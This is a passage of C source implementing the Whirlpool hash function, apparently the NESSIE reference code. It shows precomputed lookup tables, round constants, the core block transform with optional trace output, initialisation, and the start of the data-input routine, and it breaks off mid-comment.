    LL(0xa563f23f5cf26363), LL(0x06020a10120a0202), LL(0xe3aa38399338aaaa), LL(0x9371a8afdea87171),
    LL(0x45c8cf0ec6cfc8c8), LL(0x2b197dc8d17d1919), LL(0xdb4970723b704949), LL(0x76d99a865f9ad9d9),
    LL(0x0bf21dc3311df2f2), LL(0x38e3484ba848e3e3), LL(0xed5b2ae2b92a5b5b), LL(0x85889234bc928888),
    LL(0xb39ac8a43ec89a9a), LL(0x6a26be2d0bbe2626), LL(0x5632fa8dbffa3232), LL(0xcdb04ae9594ab0b0),
    LL(0x26e96a1bf26ae9e9), LL(0x110f337877330f0f), LL(0x62d5a6e633a6d5d5), LL(0x9d80ba74f4ba8080),
    LL(0xdfbe7c99277cbebe), LL(0x4acdde26ebdecdcd), LL(0x5c34e4bd89e43434), LL(0xd848757a32754848),
    LL(0x1cff24ab5424ffff), LL(0x8e7a8ff78d8f7a7a), LL(0xad90eaf464ea9090), LL(0xe15f3ec29d3e5f5f),
    LL(0x6020a01d3da02020), LL(0xb868d5670fd56868), LL(0x2e1a72d0ca721a1a), LL(0xefae2c19b72caeae),
    LL(0xc1b45ec97d5eb4b4), LL(0xfc54199ace195454), LL(0xa893e5ec7fe59393), LL(0x6622aa0d2faa2222),
    LL(0xac64e90763e96464), LL(0x0ef112db2a12f1f1), LL(0x9573a2bfcca27373), LL(0x36125a90825a1212),
    LL(0xc0405d3a7a5d4040), LL(0x1808284048280808), LL(0x58c3e85695e8c3c3), LL(0x29ec7b33df7becec),
    LL(0x70db90964d90dbdb), LL(0xfea11f61c01fa1a1), LL(0x8a8d831c91838d8d), LL(0x473dc9f5c8c93d3d),
    LL(0xa497f1cc5bf19797), LL(0x0000000000000000), LL(0x4ccfd436f9d4cfcf), LL(0x7d2b87456e872b2b),
    LL(0x9a76b397e1b37676), LL(0x9b82b064e6b08282), LL(0x67d6a9fe28a9d6d6), LL(0x2d1b77d8c3771b1b),
    LL(0xc2b55bc1745bb5b5), LL(0xecaf2911be29afaf), LL(0xbe6adf771ddf6a6a), LL(0xf0500dbaea0d5050),
    LL(0xcf454c12574c4545), LL(0x08f318cb3818f3f3), LL(0x5030f09dadf03030), LL(0x2cef742bc474efef),
    LL(0x413fc3e5dac33f3f), LL(0xff551c92c71c5555), LL(0xfba21079db10a2a2), LL(0x23ea6503e965eaea),
    LL(0xaf65ec0f6aec6565), LL(0xd3ba68b90368baba), LL(0x712f93654a932f2f), LL(0x5dc0e74e8ee7c0c0),
    LL(0x7fde81be6081dede), LL(0x241c6ce0fc6c1c1c), LL(0x1afd2ebb462efdfd), LL(0xd74d64521f644d4d),
    LL(0xab92e0e476e09292), LL(0x9f75bc8ffabc7575), LL(0x0a061e30361e0606), LL(0x838a9824ae988a8a),
    LL(0xcbb240f94b40b2b2), LL(0x37e659638559e6e6), LL(0x120e36707e360e0e), LL(0x211f63f8e7631f1f),
    LL(0xa662f73755f76262), LL(0x61d4a3ee3aa3d4d4), LL(0xe5a832298132a8a8), LL(0xa796f4c452f49696),
    LL(0x16f93a9b623af9f9), LL(0x52c5f666a3f6c5c5), LL(0x6f25b13510b12525), LL(0xeb5920f2ab205959),
    LL(0x9184ae54d0ae8484), LL(0x9672a7b7c5a77272), LL(0x4b39ddd5ecdd3939), LL(0xd44c615a16614c4c),
    LL(0xe25e3bca943b5e5e), LL(0x887885e79f857878), LL(0x4838d8dde5d83838), LL(0x898c861498868c8c),
    LL(0x6ed1b2c617b2d1d1), LL(0xf2a50b41e40ba5a5), LL(0x3be24d43a14de2e2), LL(0xa361f82f4ef86161),
    LL(0xc8b345f14245b3b3), LL(0x6321a51534a52121), LL(0xb99cd69408d69c9c), LL(0x221e66f0ee661e1e),
    LL(0xc543522261524343), LL(0x54c7fc76b1fcc7c7), LL(0x19fc2bb34f2bfcfc), LL(0x0c04142024140404),
    LL(0xf35108b2e3085151), LL(0xb699c7bc25c79999), LL(0xb76dc44f22c46d6d), LL(0x170d396865390d0d),
    LL(0x13fa35837935fafa), LL(0x7cdf84b66984dfdf), LL(0x827e9bd7a99b7e7e), LL(0x6c24b43d19b42424),
    LL(0x4d3bd7c5fed73b3b), LL(0xe0ab3d319a3dabab), LL(0x4fced13ef0d1cece), LL(0x3311558899551111),
    LL(0x8c8f890c83898f8f), LL(0xd24e6b4a046b4e4e), LL(0xc4b751d16651b7b7), LL(0x20eb600be060ebeb),
    LL(0x443cccfdc1cc3c3c), LL(0x9e81bf7cfdbf8181), LL(0xa194fed440fe9494), LL(0x04f70ceb1c0cf7f7),
    LL(0xd6b967a11867b9b9), LL(0x35135f988b5f1313), LL(0x742c9c7d519c2c2c), LL(0x68d3b8d605b8d3d3),
    LL(0x34e75c6b8c5ce7e7), LL(0xb26ecb5739cb6e6e), LL(0x51c4f36eaaf3c4c4), LL(0x05030f181b0f0303),
    LL(0xfa56138adc135656), LL(0xcc44491a5e494444), LL(0x817f9edfa09e7f7f), LL(0xe6a937218837a9a9),
    LL(0x7e2a824d67822a2a), LL(0xd0bb6db10a6dbbbb), LL(0x5ec1e24687e2c1c1), LL(0xf55302a2f1025353),
    LL(0x79dc8bae728bdcdc), LL(0x1d0b275853270b0b), LL(0xba9dd39c01d39d9d), LL(0xb46cc1472bc16c6c),
    LL(0x5331f595a4f53131), LL(0x9c74b987f3b97474), LL(0x07f609e31509f6f6), LL(0xca46430a4c434646),
    LL(0xe9ac2609a526acac), LL(0x8689973cb5978989), LL(0x3c1444a0b4441414), LL(0x3ee1425bba42e1e1),
    LL(0x3a164eb0a64e1616), LL(0x4e3ad2cdf7d23a3a), LL(0xbb69d06f06d06969), LL(0x1b092d48412d0909),
    LL(0x9070ada7d7ad7070), LL(0xc7b654d96f54b6b6), LL(0x6dd0b7ce1eb7d0d0), LL(0x2aed7e3bd67eeded),
    LL(0x49ccdb2ee2dbcccc), LL(0xc642572a68574242), LL(0xb598c2b42cc29898), LL(0xf1a40e49ed0ea4a4),
    LL(0x7828885d75882828), LL(0xe45c31da86315c5c), LL(0x15f83f936b3ff8f8), LL(0x9786a444c2a48686),
};

static const u64 C7[256] = {
    LL(0x18281878c0d87818), LL(0x236523af0526af23), LL(0xc657c6f97eb8f9c6), LL(0xe825e86f13fb6fe8),
    LL(0x879487a14ccba187), LL(0xb8d5b862a91162b8), LL(0x0103010508090501), LL(0x4fd14f6e420d6e4f),
    LL(0x365a36eead9bee36), LL(0xa6f7a60459ff04a6), LL(0xd26bd2bdde0cbdd2), LL(0xf502f506fb0e06f5),
    LL(0x798b7980ef968079), LL(0x6fb16fce5f30ce6f), LL(0x91ae91effc6def91), LL(0x52f65207aaf80752),
    LL(0x60a060fd2747fd60), LL(0xbcd9bc76893576bc), LL(0x9bb09bcdac37cd9b), LL(0x8e8f8e8c048a8c8e),
    LL(0xa3f8a31571d215a3), LL(0x0c140c3c606c3c0c), LL(0x7b8d7b8aff848a7b), LL(0x355f35e1b580e135),
    LL(0x1d271d69e8f5691d), LL(0xe03de04753b347e0), LL(0xd764d7acf621acd7), LL(0xc25bc2ed5e9cedc2),
    LL(0x2e722e966d43962e), LL(0x4bdd4b7a62297a4b), LL(0xfe1ffe21a35d21fe), LL(0x57f9571682d51657),
    LL(0x153f1541a8bd4115), LL(0x779977b69fe8b677), LL(0x375937eba592eb37), LL(0xe532e5567b9e56e5),
    LL(0x9fbc9fd98c13d99f), LL(0xf00df017d32317f0), LL(0x4ade4a7f6a207f4a), LL(0xda73da959e4495da),
    LL(0x58e85825faa22558), LL(0xc946c9ca06cfcac9), LL(0x297b298d557c8d29), LL(0x0a1e0a22505a220a),
    LL(0xb1ceb14fe1504fb1), LL(0xa0fda01a69c91aa0), LL(0x6bbd6bda7f14da6b), LL(0x859285ab5cd9ab85),
    LL(0xbddabd73813c73bd), LL(0x5de75d34d28f345d), LL(0x1030105080905010), LL(0xf401f403f30703f4),
    LL(0xcb40cbc016ddc0cb), LL(0x3e423ec6edd3c63e), LL(0x050f0511282d1105), LL(0x67a967e61f78e667),
    LL(0xe431e453739753e4), LL(0x276927bb2502bb27), LL(0x41c3415832735841), LL(0x8b808b9d2ca79d8b),
    LL(0xa7f4a70151f601a7), LL(0x7d877d94cfb2947d), LL(0x95a295fbdc49fb95), LL(0xd875d89f8e569fd8),
    LL(0xfb10fb308b7030fb), LL(0xee2fee7123cd71ee), LL(0x7c847c91c7bb917c), LL(0x66aa66e31771e366),
    LL(0xdd7add8ea67b8edd), LL(0x1739174bb8af4b17), LL(0x47c9474602454647), LL(0x9ebf9edc841adc9e),
    LL(0xca43cac51ed4c5ca), LL(0x2d772d997558992d), LL(0xbfdcbf79912e79bf), LL(0x0709071b383f1b07),
    LL(0xadeaad2301ac23ad), LL(0x5aee5a2feab02f5a), LL(0x839883b56cefb583), LL(0x335533ff85b6ff33),
    LL(0x63a563f23f5cf263), LL(0x0206020a10120a02), LL(0xaae3aa38399338aa), LL(0x719371a8afdea871),
    LL(0xc845c8cf0ec6cfc8), LL(0x192b197dc8d17d19), LL(0x49db4970723b7049), LL(0xd976d99a865f9ad9),
    LL(0xf20bf21dc3311df2), LL(0xe338e3484ba848e3), LL(0x5bed5b2ae2b92a5b), LL(0x8885889234bc9288),
    LL(0x9ab39ac8a43ec89a), LL(0x266a26be2d0bbe26), LL(0x325632fa8dbffa32), LL(0xb0cdb04ae9594ab0),
    LL(0xe926e96a1bf26ae9), LL(0x0f110f337877330f), LL(0xd562d5a6e633a6d5), LL(0x809d80ba74f4ba80),
    LL(0xbedfbe7c99277cbe), LL(0xcd4acdde26ebdecd), LL(0x345c34e4bd89e434), LL(0x48d848757a327548),
    LL(0xff1cff24ab5424ff), LL(0x7a8e7a8ff78d8f7a), LL(0x90ad90eaf464ea90), LL(0x5fe15f3ec29d3e5f),
    LL(0x206020a01d3da020), LL(0x68b868d5670fd568), LL(0x1a2e1a72d0ca721a), LL(0xaeefae2c19b72cae),
    LL(0xb4c1b45ec97d5eb4), LL(0x54fc54199ace1954), LL(0x93a893e5ec7fe593), LL(0x226622aa0d2faa22),
    LL(0x64ac64e90763e964), LL(0xf10ef112db2a12f1), LL(0x739573a2bfcca273), LL(0x1236125a90825a12),
    LL(0x40c0405d3a7a5d40), LL(0x0818082840482808), LL(0xc358c3e85695e8c3), LL(0xec29ec7b33df7bec),
    LL(0xdb70db90964d90db), LL(0xa1fea11f61c01fa1), LL(0x8d8a8d831c91838d), LL(0x3d473dc9f5c8c93d),
    LL(0x97a497f1cc5bf197), LL(0x0000000000000000), LL(0xcf4ccfd436f9d4cf), LL(0x2b7d2b87456e872b),
    LL(0x769a76b397e1b376), LL(0x829b82b064e6b082), LL(0xd667d6a9fe28a9d6), LL(0x1b2d1b77d8c3771b),
    LL(0xb5c2b55bc1745bb5), LL(0xafecaf2911be29af), LL(0x6abe6adf771ddf6a), LL(0x50f0500dbaea0d50),
    LL(0x45cf454c12574c45), LL(0xf308f318cb3818f3), LL(0x305030f09dadf030), LL(0xef2cef742bc474ef),
    LL(0x3f413fc3e5dac33f), LL(0x55ff551c92c71c55), LL(0xa2fba21079db10a2), LL(0xea23ea6503e965ea),
    LL(0x65af65ec0f6aec65), LL(0xbad3ba68b90368ba), LL(0x2f712f93654a932f), LL(0xc05dc0e74e8ee7c0),
    LL(0xde7fde81be6081de), LL(0x1c241c6ce0fc6c1c), LL(0xfd1afd2ebb462efd), LL(0x4dd74d64521f644d),
    LL(0x92ab92e0e476e092), LL(0x759f75bc8ffabc75), LL(0x060a061e30361e06), LL(0x8a838a9824ae988a),
    LL(0xb2cbb240f94b40b2), LL(0xe637e659638559e6), LL(0x0e120e36707e360e), LL(0x1f211f63f8e7631f),
    LL(0x62a662f73755f762), LL(0xd461d4a3ee3aa3d4), LL(0xa8e5a832298132a8), LL(0x96a796f4c452f496),
    LL(0xf916f93a9b623af9), LL(0xc552c5f666a3f6c5), LL(0x256f25b13510b125), LL(0x59eb5920f2ab2059),
    LL(0x849184ae54d0ae84), LL(0x729672a7b7c5a772), LL(0x394b39ddd5ecdd39), LL(0x4cd44c615a16614c),
    LL(0x5ee25e3bca943b5e), LL(0x78887885e79f8578), LL(0x384838d8dde5d838), LL(0x8c898c861498868c),
    LL(0xd16ed1b2c617b2d1), LL(0xa5f2a50b41e40ba5), LL(0xe23be24d43a14de2), LL(0x61a361f82f4ef861),
    LL(0xb3c8b345f14245b3), LL(0x216321a51534a521), LL(0x9cb99cd69408d69c), LL(0x1e221e66f0ee661e),
    LL(0x43c5435222615243), LL(0xc754c7fc76b1fcc7), LL(0xfc19fc2bb34f2bfc), LL(0x040c041420241404),
    LL(0x51f35108b2e30851), LL(0x99b699c7bc25c799), LL(0x6db76dc44f22c46d), LL(0x0d170d396865390d),
    LL(0xfa13fa35837935fa), LL(0xdf7cdf84b66984df), LL(0x7e827e9bd7a99b7e), LL(0x246c24b43d19b424),
    LL(0x3b4d3bd7c5fed73b), LL(0xabe0ab3d319a3dab), LL(0xce4fced13ef0d1ce), LL(0x1133115588995511),
    LL(0x8f8c8f890c83898f), LL(0x4ed24e6b4a046b4e), LL(0xb7c4b751d16651b7), LL(0xeb20eb600be060eb),
    LL(0x3c443cccfdc1cc3c), LL(0x819e81bf7cfdbf81), LL(0x94a194fed440fe94), LL(0xf704f70ceb1c0cf7),
    LL(0xb9d6b967a11867b9), LL(0x1335135f988b5f13), LL(0x2c742c9c7d519c2c), LL(0xd368d3b8d605b8d3),
    LL(0xe734e75c6b8c5ce7), LL(0x6eb26ecb5739cb6e), LL(0xc451c4f36eaaf3c4), LL(0x0305030f181b0f03),
    LL(0x56fa56138adc1356), LL(0x44cc44491a5e4944), LL(0x7f817f9edfa09e7f), LL(0xa9e6a937218837a9),
    LL(0x2a7e2a824d67822a), LL(0xbbd0bb6db10a6dbb), LL(0xc15ec1e24687e2c1), LL(0x53f55302a2f10253),
    LL(0xdc79dc8bae728bdc), LL(0x0b1d0b275853270b), LL(0x9dba9dd39c01d39d), LL(0x6cb46cc1472bc16c),
    LL(0x315331f595a4f531), LL(0x749c74b987f3b974), LL(0xf607f609e31509f6), LL(0x46ca46430a4c4346),
    LL(0xace9ac2609a526ac), LL(0x898689973cb59789), LL(0x143c1444a0b44414), LL(0xe13ee1425bba42e1),
    LL(0x163a164eb0a64e16), LL(0x3a4e3ad2cdf7d23a), LL(0x69bb69d06f06d069), LL(0x091b092d48412d09),
    LL(0x709070ada7d7ad70), LL(0xb6c7b654d96f54b6), LL(0xd06dd0b7ce1eb7d0), LL(0xed2aed7e3bd67eed),
    LL(0xcc49ccdb2ee2dbcc), LL(0x42c642572a685742), LL(0x98b598c2b42cc298), LL(0xa4f1a40e49ed0ea4),
    LL(0x287828885d758828), LL(0x5ce45c31da86315c), LL(0xf815f83f936b3ff8), LL(0x869786a444c2a486),
};
#endif /* OBSOLETE */

static const u64 rc[R + 1] = {
    LL(0x0000000000000000),
    LL(0x1823c6e887b8014f),
    LL(0x36a6d2f5796f9152),
    LL(0x60bc9b8ea30c7b35),
    LL(0x1de0d7c22e4bfe57),
    LL(0x157737e59ff04ada),
    LL(0x58c9290ab1a06b85),
    LL(0xbd5d10f4cb3e0567),
    LL(0xe427418ba77d95d8),
    LL(0xfbee7c66dd17479e),
    LL(0xca2dbf07ad5a8333),
};

/**
 * The core Whirlpool transform.
 */
static void processBuffer(struct NESSIEstruct* const structpointer) {
    int i, r;
    u64 K[8];        /* the round key */
    u64 block[8];    /* mu(buffer) */
    u64 state[8];    /* the cipher state */
    u64 L[8];
    u8* buffer = structpointer->buffer;

#ifdef TRACE_INTERMEDIATE_VALUES
    printf("The 8x8 matrix Z' derived from the data-string is as follows.\n");
    for (i = 0; i < WBLOCKBYTES / 8; i++) {
        printf("    %02X %02X %02X %02X %02X %02X %02X %02X\n",
            buffer[0], buffer[1], buffer[2], buffer[3],
            buffer[4], buffer[5], buffer[6], buffer[7]);
        buffer += 8;
    }
    printf("\n");
    buffer = structpointer->buffer;
#endif /* ?TRACE_INTERMEDIATE_VALUES */

    /*
     * map the buffer to a block:
     */
    for (i = 0; i < 8; i++, buffer += 8) {
        block[i] =
            (((u64)buffer[0]) << 56) ^
            (((u64)buffer[1] & 0xffL) << 48) ^
            (((u64)buffer[2] & 0xffL) << 40) ^
            (((u64)buffer[3] & 0xffL) << 32) ^
            (((u64)buffer[4] & 0xffL) << 24) ^
            (((u64)buffer[5] & 0xffL) << 16) ^
            (((u64)buffer[6] & 0xffL) << 8) ^
            (((u64)buffer[7] & 0xffL));
    }
    /*
     * compute and apply K^0 to the cipher state:
     */
    state[0] = block[0] ^ (K[0] = structpointer->hash[0]);
    state[1] = block[1] ^ (K[1] = structpointer->hash[1]);
    state[2] = block[2] ^ (K[2] = structpointer->hash[2]);
    state[3] = block[3] ^ (K[3] = structpointer->hash[3]);
    state[4] = block[4] ^ (K[4] = structpointer->hash[4]);
    state[5] = block[5] ^ (K[5] = structpointer->hash[5]);
    state[6] = block[6] ^ (K[6] = structpointer->hash[6]);
    state[7] = block[7] ^ (K[7] = structpointer->hash[7]);
#ifdef TRACE_INTERMEDIATE_VALUES
    printf("The K_0 matrix (from the initialization value IV) and X'' matrix are as follows.\n");
    for (i = 0; i < DIGESTBYTES / 8; i++) {
        printf(
            "    %02X %02X %02X %02X %02X %02X %02X %02X        %02X %02X %02X %02X %02X %02X %02X %02X\n",
            (u8)(K[i] >> 56),
            (u8)(K[i] >> 48),
            (u8)(K[i] >> 40),
            (u8)(K[i] >> 32),
            (u8)(K[i] >> 24),
            (u8)(K[i] >> 16),
            (u8)(K[i] >> 8),
            (u8)(K[i]),

            (u8)(state[i] >> 56),
            (u8)(state[i] >> 48),
            (u8)(state[i] >> 40),
            (u8)(state[i] >> 32),
            (u8)(state[i] >> 24),
            (u8)(state[i] >> 16),
            (u8)(state[i] >> 8),
            (u8)(state[i]));
    }
    printf("\n");
    printf("The following are (hexadecimal representations of) the successive values of the variables K_i for i = 1 to 10 and W'.\n");
    printf("\n");
#endif /* ?TRACE_INTERMEDIATE_VALUES */
    /*
     * iterate over all rounds:
     */
    for (r = 1; r <= R; r++) {
        /*
         * compute K^r from K^{r-1}:
         */
        L[0] =
            C0[(int)(K[0] >> 56)] ^
            C1[(int)(K[7] >> 48) & 0xff] ^
            C2[(int)(K[6] >> 40) & 0xff] ^
            C3[(int)(K[5] >> 32) & 0xff] ^
            C4[(int)(K[4] >> 24) & 0xff] ^
            C5[(int)(K[3] >> 16) & 0xff] ^
            C6[(int)(K[2] >> 8) & 0xff] ^
            C7[(int)(K[1]) & 0xff] ^
            rc[r];
        L[1] =
            C0[(int)(K[1] >> 56)] ^
            C1[(int)(K[0] >> 48) & 0xff] ^
            C2[(int)(K[7] >> 40) & 0xff] ^
            C3[(int)(K[6] >> 32) & 0xff] ^
            C4[(int)(K[5] >> 24) & 0xff] ^
            C5[(int)(K[4] >> 16) & 0xff] ^
            C6[(int)(K[3] >> 8) & 0xff] ^
            C7[(int)(K[2]) & 0xff];
        L[2] =
            C0[(int)(K[2] >> 56)] ^
            C1[(int)(K[1] >> 48) & 0xff] ^
            C2[(int)(K[0] >> 40) & 0xff] ^
            C3[(int)(K[7] >> 32) & 0xff] ^
            C4[(int)(K[6] >> 24) & 0xff] ^
            C5[(int)(K[5] >> 16) & 0xff] ^
            C6[(int)(K[4] >> 8) & 0xff] ^
            C7[(int)(K[3]) & 0xff];
        L[3] =
            C0[(int)(K[3] >> 56)] ^
            C1[(int)(K[2] >> 48) & 0xff] ^
            C2[(int)(K[1] >> 40) & 0xff] ^
            C3[(int)(K[0] >> 32) & 0xff] ^
            C4[(int)(K[7] >> 24) & 0xff] ^
            C5[(int)(K[6] >> 16) & 0xff] ^
            C6[(int)(K[5] >> 8) & 0xff] ^
            C7[(int)(K[4]) & 0xff];
        L[4] =
            C0[(int)(K[4] >> 56)] ^
            C1[(int)(K[3] >> 48) & 0xff] ^
            C2[(int)(K[2] >> 40) & 0xff] ^
            C3[(int)(K[1] >> 32) & 0xff] ^
            C4[(int)(K[0] >> 24) & 0xff] ^
            C5[(int)(K[7] >> 16) & 0xff] ^
            C6[(int)(K[6] >> 8) & 0xff] ^
            C7[(int)(K[5]) & 0xff];
        L[5] =
            C0[(int)(K[5] >> 56)] ^
            C1[(int)(K[4] >> 48) & 0xff] ^
            C2[(int)(K[3] >> 40) & 0xff] ^
            C3[(int)(K[2] >> 32) & 0xff] ^
            C4[(int)(K[1] >> 24) & 0xff] ^
            C5[(int)(K[0] >> 16) & 0xff] ^
            C6[(int)(K[7] >> 8) & 0xff] ^
            C7[(int)(K[6]) & 0xff];
        L[6] =
            C0[(int)(K[6] >> 56)] ^
            C1[(int)(K[5] >> 48) & 0xff] ^
            C2[(int)(K[4] >> 40) & 0xff] ^
            C3[(int)(K[3] >> 32) & 0xff] ^
            C4[(int)(K[2] >> 24) & 0xff] ^
            C5[(int)(K[1] >> 16) & 0xff] ^
            C6[(int)(K[0] >> 8) & 0xff] ^
            C7[(int)(K[7]) & 0xff];
        L[7] =
            C0[(int)(K[7] >> 56)] ^
            C1[(int)(K[6] >> 48) & 0xff] ^
            C2[(int)(K[5] >> 40) & 0xff] ^
            C3[(int)(K[4] >> 32) & 0xff] ^
            C4[(int)(K[3] >> 24) & 0xff] ^
            C5[(int)(K[2] >> 16) & 0xff] ^
            C6[(int)(K[1] >> 8) & 0xff] ^
            C7[(int)(K[0]) & 0xff];
        K[0] = L[0];
        K[1] = L[1];
        K[2] = L[2];
        K[3] = L[3];
        K[4] = L[4];
        K[5] = L[5];
        K[6] = L[6];
        K[7] = L[7];
        /*
         * apply the r-th round transformation:
         */
        L[0] =
            C0[(int)(state[0] >> 56)] ^
            C1[(int)(state[7] >> 48) & 0xff] ^
            C2[(int)(state[6] >> 40) & 0xff] ^
            C3[(int)(state[5] >> 32) & 0xff] ^
            C4[(int)(state[4] >> 24) & 0xff] ^
            C5[(int)(state[3] >> 16) & 0xff] ^
            C6[(int)(state[2] >> 8) & 0xff] ^
            C7[(int)(state[1]) & 0xff] ^
            K[0];
        L[1] =
            C0[(int)(state[1] >> 56)] ^
            C1[(int)(state[0] >> 48) & 0xff] ^
            C2[(int)(state[7] >> 40) & 0xff] ^
            C3[(int)(state[6] >> 32) & 0xff] ^
            C4[(int)(state[5] >> 24) & 0xff] ^
            C5[(int)(state[4] >> 16) & 0xff] ^
            C6[(int)(state[3] >> 8) & 0xff] ^
            C7[(int)(state[2]) & 0xff] ^
            K[1];
        L[2] =
            C0[(int)(state[2] >> 56)] ^
            C1[(int)(state[1] >> 48) & 0xff] ^
            C2[(int)(state[0] >> 40) & 0xff] ^
            C3[(int)(state[7] >> 32) & 0xff] ^
            C4[(int)(state[6] >> 24) & 0xff] ^
            C5[(int)(state[5] >> 16) & 0xff] ^
            C6[(int)(state[4] >> 8) & 0xff] ^
            C7[(int)(state[3]) & 0xff] ^
            K[2];
        L[3] =
            C0[(int)(state[3] >> 56)] ^
            C1[(int)(state[2] >> 48) & 0xff] ^
            C2[(int)(state[1] >> 40) & 0xff] ^
            C3[(int)(state[0] >> 32) & 0xff] ^
            C4[(int)(state[7] >> 24) & 0xff] ^
            C5[(int)(state[6] >> 16) & 0xff] ^
            C6[(int)(state[5] >> 8) & 0xff] ^
            C7[(int)(state[4]) & 0xff] ^
            K[3];
        L[4] =
            C0[(int)(state[4] >> 56)] ^
            C1[(int)(state[3] >> 48) & 0xff] ^
            C2[(int)(state[2] >> 40) & 0xff] ^
            C3[(int)(state[1] >> 32) & 0xff] ^
            C4[(int)(state[0] >> 24) & 0xff] ^
            C5[(int)(state[7] >> 16) & 0xff] ^
            C6[(int)(state[6] >> 8) & 0xff] ^
            C7[(int)(state[5]) & 0xff] ^
            K[4];
        L[5] =
            C0[(int)(state[5] >> 56)] ^
            C1[(int)(state[4] >> 48) & 0xff] ^
            C2[(int)(state[3] >> 40) & 0xff] ^
            C3[(int)(state[2] >> 32) & 0xff] ^
            C4[(int)(state[1] >> 24) & 0xff] ^
            C5[(int)(state[0] >> 16) & 0xff] ^
            C6[(int)(state[7] >> 8) & 0xff] ^
            C7[(int)(state[6]) & 0xff] ^
            K[5];
        L[6] =
            C0[(int)(state[6] >> 56)] ^
            C1[(int)(state[5] >> 48) & 0xff] ^
            C2[(int)(state[4] >> 40) & 0xff] ^
            C3[(int)(state[3] >> 32) & 0xff] ^
            C4[(int)(state[2] >> 24) & 0xff] ^
            C5[(int)(state[1] >> 16) & 0xff] ^
            C6[(int)(state[0] >> 8) & 0xff] ^
            C7[(int)(state[7]) & 0xff] ^
            K[6];
        L[7] =
            C0[(int)(state[7] >> 56)] ^
            C1[(int)(state[6] >> 48) & 0xff] ^
            C2[(int)(state[5] >> 40) & 0xff] ^
            C3[(int)(state[4] >> 32) & 0xff] ^
            C4[(int)(state[3] >> 24) & 0xff] ^
            C5[(int)(state[2] >> 16) & 0xff] ^
            C6[(int)(state[1] >> 8) & 0xff] ^
            C7[(int)(state[0]) & 0xff] ^
            K[7];
        state[0] = L[0];
        state[1] = L[1];
        state[2] = L[2];
        state[3] = L[3];
        state[4] = L[4];
        state[5] = L[5];
        state[6] = L[6];
        state[7] = L[7];
#ifdef TRACE_INTERMEDIATE_VALUES
        printf("i = %d:\n", r);
        for (i = 0; i < DIGESTBYTES / 8; i++) {
            printf(
                "    %02X %02X %02X %02X %02X %02X %02X %02X        %02X %02X %02X %02X %02X %02X %02X %02X\n",
                (u8)(K[i] >> 56),
                (u8)(K[i] >> 48),
                (u8)(K[i] >> 40),
                (u8)(K[i] >> 32),
                (u8)(K[i] >> 24),
                (u8)(K[i] >> 16),
                (u8)(K[i] >> 8),
                (u8)(K[i]),

                (u8)(state[i] >> 56),
                (u8)(state[i] >> 48),
                (u8)(state[i] >> 40),
                (u8)(state[i] >> 32),
                (u8)(state[i] >> 24),
                (u8)(state[i] >> 16),
                (u8)(state[i] >> 8),
                (u8)(state[i]));
        }
        printf("\n");
#endif /* ?TRACE_INTERMEDIATE_VALUES */
    }
    /*
     * apply the Miyaguchi-Preneel compression function:
     */
    structpointer->hash[0] ^= state[0] ^ block[0];
    structpointer->hash[1] ^= state[1] ^ block[1];
    structpointer->hash[2] ^= state[2] ^ block[2];
    structpointer->hash[3] ^= state[3] ^ block[3];
    structpointer->hash[4] ^= state[4] ^ block[4];
    structpointer->hash[5] ^= state[5] ^ block[5];
    structpointer->hash[6] ^= state[6] ^ block[6];
    structpointer->hash[7] ^= state[7] ^ block[7];
#ifdef TRACE_INTERMEDIATE_VALUES
    //printf("Intermediate hash value (after Miyaguchi-Preneel):\n");
    printf("The value of Y' output from the round-function is as follows.\n");
    for (i = 0; i < DIGESTBYTES / 8; i++) {
        printf("    %02X %02X %02X %02X %02X %02X %02X %02X\n",
            (u8)(structpointer->hash[i] >> 56),
            (u8)(structpointer->hash[i] >> 48),
            (u8)(structpointer->hash[i] >> 40),
            (u8)(structpointer->hash[i] >> 32),
            (u8)(structpointer->hash[i] >> 24),
            (u8)(structpointer->hash[i] >> 16),
            (u8)(structpointer->hash[i] >> 8),
            (u8)(structpointer->hash[i]));
    }
    printf("\n");
#endif /* ?TRACE_INTERMEDIATE_VALUES */
}

/**
 * Initialize the hashing state.
 */
void NESSIEinit(struct NESSIEstruct* const structpointer) {
    int i;

    memset(structpointer->bitLength, 0, 32);
    structpointer->bufferBits = structpointer->bufferPos = 0;
    structpointer->buffer[0] = 0; /* it's only necessary to cleanup buffer[bufferPos] */
    for (i = 0; i < 8; i++) {
        structpointer->hash[i] = 0L; /* initial value */
    }
#ifdef TRACE_INTERMEDIATE_VALUES
    /*
    printf("Initial hash value:\n");
    for (i = 0; i < DIGESTBYTES/8; i++) {
        printf("    %02X %02X %02X %02X %02X %02X %02X %02X\n",
            (u8)(structpointer->hash[i] >> 56),
            (u8)(structpointer->hash[i] >> 48),
            (u8)(structpointer->hash[i] >> 40),
            (u8)(structpointer->hash[i] >> 32),
            (u8)(structpointer->hash[i] >> 24),
            (u8)(structpointer->hash[i] >> 16),
            (u8)(structpointer->hash[i] >>  8),
            (u8)(structpointer->hash[i]      ));
    }
    printf("\n");
    */
#endif /* ?TRACE_INTERMEDIATE_VALUES */
}

/**
 * Delivers input data to the hashing algorithm.
 *
 * @param    source        plaintext data to hash.
 * @param    sourceBits    how many bits of plaintext to process.
 *
 * This method maintains the invariant: bufferBits < DIGESTBITS
 */
void NESSIEadd(const unsigned char* const source,
    unsigned long sourceBits,
    struct NESSIEstruct* const structpointer) {
    /*
                       sourcePos
                       |
                       +-------+-------+-------
                          ||||||||||||||||||||| source
                       +-------+-------+-------
    +-------+-------+-------+-------+-------+-------
    ||||||||||||||||||||||                           buffer
    +-------+-------+-------+-------+-------+-------
                    |
                    bufferPos
    */
    int sourcePos = 0; /* index of leftmost source u8 containing data (1 to 8 bits). */
    int sourceGap = (8 - ((int)sourceBits & 7)) & 7; /* space on source[sourcePos]. */
    int bufferRem = structpointer->bufferBits & 7; /* occupied bits on buffer[bufferPos]. */
    int i;
    u32 b, carry;
    u8* buffer = structpointer->buffer;
    u8* bitLength = structpointer->bitLength;
    int bufferBits = structpointer->bufferBits;
    int bufferPos = structpointer->bufferPos;

    /*
     * tally the length of the added data:
     */
    u64 value = sourceBits;
    for (i = 31, carry = 0; i >= 0 && (carry != 0 || value != LL(0)); i--) {
        carry += bitLength[i] + ((u32)value & 0xff);
        bitLength[i] = (u8)carry;
        carry >>= 8;
        value >>= 8;
    }
    /*
     * process data in chunks of 8 bits (a more efficient approach would be to take whole-word chunks):
     */
    while (sourceBits > 8) {
        /* N.B. at least source[sourcePos] and source[sourcePos+1] contain data. */
        /*
         * take a byte from the source:
         */
        b = ((source[sourcePos] << sourceGap) & 0xff) |
            ((source[sourcePos + 1] & 0xff) >> (8 - sourceGap));
        /*
         * process this byte:
